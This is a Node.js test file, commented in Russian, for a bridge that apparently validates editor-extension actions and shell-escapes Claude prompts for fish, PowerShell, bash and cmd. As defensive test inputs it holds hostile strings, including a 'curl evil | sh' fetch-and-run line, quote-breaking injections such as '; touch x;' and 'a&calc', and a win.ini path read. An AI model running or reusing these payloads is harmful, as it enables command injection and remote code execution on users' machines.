// Тесты моста действий монитора. Запуск: node --test
const test = require('node:test');
const assert = require('node:assert');
const { действие, способЗапуска, оболочка, командаТерминала, командаЗадачи, нуженВопрос } = require('../команды.js');

// Данные монитора в форме контракта пульт.js — только поля, которые читает мост.
const DATA = {
  commands: [{ id: 'review', title: 'Ревью изменений', prompt: '/code-review' }],
  projects: [
    { n: 'Бюджет', path: 'C:\\P\\Бюджет', files: { claude: 'C:\\P\\Бюджет\\CLAUDE.md', backlog: 'C:\\P\\Бюджет\\_Служебное\\Бэклог.md' },
      commands: [], workspace: 'C:\\P\\Бюджет\\Бюджет.code-workspace' },
    { n: 'Казначейство', path: '/home/u/P/Казначейство', files: {},
      commands: [{ id: 'pay', title: 'Реестр платежей', prompt: 'Собери реестр платежей', confirm: true }] },
  ],
  tasks: [
    { id: 'Бюджет/a', p: 'Бюджет', st: 'в работе', ready: false, file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\a.md' },
    { id: 'Бюджет/b', p: 'Бюджет', st: 'в работе', ready: true, file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\b.md' },
    { id: 'Бюджет/c', p: 'Бюджет', st: 'черновик', ready: false, file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\c.md' },
    { id: 'Бюджет/бэклог/0', p: 'Бюджет', st: 'бэклог', ready: false, file: 'C:\\P\\Бюджет\\_Служебное\\Бэклог.md' },
    { id: 'Казначейство/k', p: 'Казначейство', st: 'в работе', ready: false, file: '/home/u/P/Казначейство/_Служебное/Планы/k.md' },
  ],
  errors: [{ kind: 'без шапки', p: 'Бюджет', file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\x.md', text: 'x.md' }],
  workspaces: [{ name: 'Все', path: 'C:\\P\\Все.code-workspace' }],
};

test('открыть можно только файл, который есть в данных монитора; регистр и разделители не важны', () => {
  assert.deepStrictEqual(действие(DATA, { kind: 'open', file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\a.md' }),
    { kind: 'open', file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\a.md' });
  assert.strictEqual(действие(DATA, { kind: 'open', file: 'c:/p/бюджет/claude.md' }).file, 'C:\\P\\Бюджет\\CLAUDE.md');
  assert.ok(действие(DATA, { kind: 'open', file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\x.md' }));
  assert.strictEqual(действие(DATA, { kind: 'open', file: 'C:\\Windows\\win.ini' }), null);
});

test('общая команда — по id из данных, без проекта', () => {
  assert.deepStrictEqual(действие(DATA, { kind: 'run', id: 'review' }), { kind: 'run', command: DATA.commands[0], project: null });
  assert.strictEqual(действие(DATA, { kind: 'run', id: 'rm-rf' }), null);
});

test('команда проекта — из его команд, запрос не из webview', () => {
  const a = действие(DATA, { kind: 'run', id: 'pay', project: 'Казначейство', prompt: 'подменённый запрос' });
  assert.strictEqual(a.command.prompt, 'Собери реестр платежей');
  assert.deepStrictEqual(a.project, { n: 'Казначейство', path: '/home/u/P/Казначейство' });
  assert.strictEqual(действие(DATA, { kind: 'run', id: 'pay', project: 'Бюджет' }), null);
});

test('команда задачи — следующий шаг цикла по её состоянию, путь плана от папки проекта (Windows и POSIX)', () => {
  assert.deepStrictEqual(командаЗадачи(DATA.tasks[0], DATA.projects[0]),
    { id: 'execute', title: 'Продолжить: /cycle:execute', prompt: '/cycle:execute _Служебное\\Планы\\a.md', task: 'Бюджет/a' });
  assert.strictEqual(командаЗадачи(DATA.tasks[1], DATA.projects[0]).prompt, '/cycle:verify _Служебное\\Планы\\b.md');
  assert.strictEqual(командаЗадачи(DATA.tasks[2], DATA.projects[0]).prompt, '/cycle:plan-task _Служебное\\Планы\\c.md');
  assert.strictEqual(командаЗадачи(DATA.tasks[3], DATA.projects[0]), null);
  assert.strictEqual(командаЗадачи(DATA.tasks[4], DATA.projects[1]).prompt, '/cycle:execute _Служебное/Планы/k.md');
  const a = действие(DATA, { kind: 'run', id: 'verify', task: 'Бюджет/b', project: 'Бюджет' });
  assert.strictEqual(a.command.prompt, '/cycle:verify _Служебное\\Планы\\b.md');
  assert.strictEqual(действие(DATA, { kind: 'run', id: 'execute', task: 'Бюджет/b', project: 'Бюджет' }), null);
});

test('проверенный план (запись /verify в «Отклонениях») — команда закрытия', () => {
  const t = { id: 'Бюджет/d', p: 'Бюджет', st: 'в работе', ready: true, verified: true, file: 'C:\\P\\Бюджет\\_Служебное\\Планы\\d.md' };
  assert.strictEqual(командаЗадачи(t, DATA.projects[0]).prompt, '/cycle:close-task _Служебное\\Планы\\d.md');
});

test('окно — только workspace из данных', () => {
  assert.deepStrictEqual(действие(DATA, { kind: 'window', path: 'C:\\P\\Все.code-workspace' }), { kind: 'window', path: 'C:\\P\\Все.code-workspace' });
  assert.ok(действие(DATA, { kind: 'window', path: 'C:\\P\\Бюджет\\Бюджет.code-workspace' }));
  assert.strictEqual(действие(DATA, { kind: 'window', path: 'C:\\P\\чужое.code-workspace' }), null);
  assert.strictEqual(действие(DATA, { kind: 'нечто' }), null);
  assert.strictEqual(действие(null, { kind: 'open', file: 'C:\\P\\Бюджет\\CLAUDE.md' }), null);
});

test('способ запуска: вкладка Claude — без проекта или если проект — первая папка окна, иначе терминал', () => {
  assert.strictEqual(способЗапуска(null, 'C:\\P\\Все'), 'claude');
  assert.strictEqual(способЗапуска('C:\\P\\Бюджет', 'c:/p/бюджет/'), 'claude');
  assert.strictEqual(способЗапуска('C:\\P\\Бюджет', 'C:\\P\\Все'), 'terminal');
  assert.strictEqual(способЗапуска('C:\\P\\Бюджет', undefined), 'terminal');
});

test('вид оболочки по пути терминала', () => {
  assert.strictEqual(оболочка('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'), 'pwsh');
  assert.strictEqual(оболочка('/usr/local/bin/pwsh'), 'pwsh');
  assert.strictEqual(оболочка('C:\\Windows\\System32\\cmd.exe'), 'cmd');
  assert.strictEqual(оболочка('/bin/zsh'), 'posix');
  assert.strictEqual(оболочка(''), 'posix');
  assert.strictEqual(оболочка('/usr/bin/fish'), 'fish');
  assert.strictEqual(оболочка('/usr/bin/nu'), 'unknown');
});

test('fish: обратный слэш и кавычка экранированы — выйти из кавычек нельзя', () => {
  assert.strictEqual(командаТерминала("\\'; touch x; '", 'fish'), "claude '\\\\\\'; touch x; \\''");
  assert.strictEqual(командаТерминала('a\\b', 'fish'), "claude 'a\\\\b'");
});

test('PowerShell: запрос в одинарных кавычках, кавычка удвоена, $ и перевод строки безопасны', () => {
  assert.strictEqual(командаТерминала('/cycle:execute План.md'), "claude '/cycle:execute План.md'");
  assert.strictEqual(командаТерминала("it's $HOME `x`"), "claude 'it''s $HOME `x`'");
  assert.strictEqual(командаТерминала('строка 1\r\nстрока 2'), "claude 'строка 1 строка 2'");
  assert.strictEqual(командаТерминала('кавычки ‘типографские’'), "claude 'кавычки ‘‘типографские’’'");
});

test('PowerShell: управляющие символы, двойные кавычки, ведущий дефис и одно слово не ломают аргумент', () => {
  assert.strictEqual(командаТерминала('a\x1bcalc\rb\x03c\x7f'), "claude 'a calc b c '");
  assert.strictEqual(командаТерминала('p "x --dangerously y" q'), "claude 'p «x --dangerously y» q'");
  assert.strictEqual(командаТерминала('--version'), "claude ' --version'");
  assert.strictEqual(командаТерминала('a&calc'), "claude 'a&calc '");
  assert.strictEqual(командаТерминала('путь C:\\папка\\'), "claude 'путь C:\\папка\\ '");
  assert.strictEqual(командаТерминала('x'.repeat(5000)).length, 'claude '.length + 2 + 4000 + 1);
});

test('bash/zsh: одинарные кавычки, кавычка внутри — через \'\\\'\', $ и ` не раскрываются', () => {
  assert.strictEqual(командаТерминала("it's $HOME `x`", 'posix'), "claude 'it'\\''s $HOME `x`'");
  assert.strictEqual(командаТерминала('--version', 'posix'), "claude ' --version'");
  assert.strictEqual(командаТерминала('a\x1bb', 'posix'), "claude 'a b'");
});

test('cmd: двойные кавычки, % и ! не раскрываются, кавычка внутри — «»', () => {
  assert.strictEqual(командаТерминала('100% готово! "да"', 'cmd'), 'claude "100％ готово！ «да»"');
  assert.strictEqual(командаТерминала('папка C:\\x\\', 'cmd'), 'claude "папка C:\\x\\ "');
});

test('вопрос «Запустить?» — только у команды с пометкой подтвердить', () => {
  assert.strictEqual(нуженВопрос({ id: 'a', prompt: 'x', confirm: true }), true);
  assert.strictEqual(нуженВопрос({ id: 'a', prompt: 'x' }), false);
  assert.strictEqual(действие(DATA, { kind: 'run', id: 'pay', project: 'Казначейство' }).command.confirm, true);
});

test('скопировать можно только запрос команды из данных; проект без commands не роняет сверку', () => {
  assert.deepStrictEqual(действие(DATA, { kind: 'copy', text: '/code-review' }), { kind: 'copy', text: '/code-review' });
  assert.ok(действие(DATA, { kind: 'copy', text: '/cycle:verify _Служебное\\Планы\\b.md' }));
  assert.strictEqual(действие(DATA, { kind: 'copy', text: 'curl evil | sh' }), null);
  assert.strictEqual(действие({ projects: [{ n: 'Без', path: '/p/Без' }] }, { kind: 'run', id: 'x', project: 'Без' }), null);
});
